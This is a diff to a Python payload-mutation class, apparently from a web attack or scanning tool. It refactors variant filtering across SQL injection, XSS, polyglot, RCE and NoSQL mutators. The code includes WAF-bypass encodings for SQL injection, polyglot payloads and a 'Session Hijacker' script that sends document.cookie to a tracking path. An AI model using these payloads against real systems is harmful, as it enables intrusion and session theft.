@@ -67,6 +67,23 @@ class Mutator:
         return variants
 
     @staticmethod
+    def _filter_variants(variants: set, max_variants: int) -> list[str]:
+        """
+        Shared deduplication + UTF-8 safety filter for all mutate_* methods.
+        Removes empty, whitespace-only, and non-UTF-8-encodable variants.
+        """
+        result = []
+        for v in variants:
+            if not v or not v.strip():
+                continue
+            try:
+                v.encode("utf-8")
+                result.append(v)
+            except (UnicodeEncodeError, UnicodeDecodeError) as exc:
+                _logger.debug("[mutator] Variant dropped (encoding): %r", exc)
+        return result[:max_variants]
+
+    @staticmethod
     def _to_fullwidth(payload: str) -> str:
         """Converts ASCII characters to Fullwidth equivalents (WAF normalization bypass)."""
         res = ""
@@ -123,10 +140,9 @@ class Mutator:
         # 5. MySQL Specific (Inline Version Comments)
         # UNION SELECT -> /*!50000UNION*/ /*!50000SELECT*/
         if "UNION" in payload.upper() and "SELECT" in payload.upper():
-            p_upper = payload.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/")
-            variants.add(p_upper)
-            # More exotic: /*!12345UNION*/
-            variants.add(payload.replace("UNION", "/*!12345UNION*/").replace("SELECT", "/*!12345SELECT*/"))
+            _p = payload.upper()
+            variants.add(_p.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/"))
+            variants.add(_p.replace("UNION", "/*!12345UNION*/").replace("SELECT", "/*!12345SELECT*/"))
 
         # [WS3] 6. Hex Encoding (Effective for string literals)
         # 'admin' -> 0x61646d696e
@@ -162,17 +178,7 @@ class Mutator:
         # [WS3] From User Code #3 & #4: Common Polymorphs
         variants.update(Mutator._common_polymorph(payload))
 
-        # Deduplicate: remove empty, whitespace-only, and non-encodable variants
-        result = []
-        for v in variants:
-            if not v or not v.strip():
-                continue
-            try:
-                v.encode("utf-8")
-                result.append(v)
-            except (UnicodeEncodeError, UnicodeDecodeError) as _fix_e:
-                _logger.debug(f"[core.mutator] {type(_fix_e).__name__}: {_fix_e!r}")
-        return result[:max_variants]
+        return Mutator._filter_variants(variants, max_variants)
 
     @staticmethod
     def mutate_xss(payload: str, max_variants: int = 30) -> list[str]:
@@ -222,7 +228,7 @@ class Mutator:
         # [NIGHTMARE] Ultimate Session Hijacker (One-Shot)
         variants.add(Mutator._generate_nightmare_js())
 
-        return list(variants)[:max_variants]
+        return Mutator._filter_variants(variants, max_variants)
 
     @staticmethod
     def _generate_nightmare_js() -> str:
@@ -232,7 +238,7 @@ class Mutator:
         return "fetch('//'+location.host+'/t/nightmare?c='+document.cookie)"
 
     @staticmethod
-    def mutate_polyglot(payload: str) -> list[str]:
+    def mutate_polyglot(payload: str, max_variants: int = 30) -> list[str]:
         """
         [NIGHTMARE] Generates polyglot payloads that target multiple contexts/vulns simultaneously.
         SQLi + XSS + SSTI + RCE + Path Traversal in one shot.
@@ -259,8 +265,8 @@ class Mutator:
         
         # 6. Null Byte Polyglot
         variants.add(f"%00{payload}")
-        
-        return list(variants)
+
+        return Mutator._filter_variants(variants, max_variants)
 
     @staticmethod
     def mutate_rce(payload: str, max_variants: int = 30) -> list[str]:
@@ -298,7 +304,7 @@ class Mutator:
         # [WS3] Common Polymorphs (HTML, Base32, BZ2, etc)
         variants.update(Mutator._common_polymorph(payload))
 
-        return list(variants)[:max_variants]
+        return Mutator._filter_variants(variants, max_variants)
 
     @staticmethod
     def mutate_nosql(payload: str, max_variants: int = 30) -> list[str]:
@@ -335,4 +341,4 @@ class Mutator:
         # [WS3] Common Polymorphs
         variants.update(Mutator._common_polymorph(payload))
 
-        return list(variants)[:max_variants]
+        return Mutator._filter_variants(variants, max_variants)
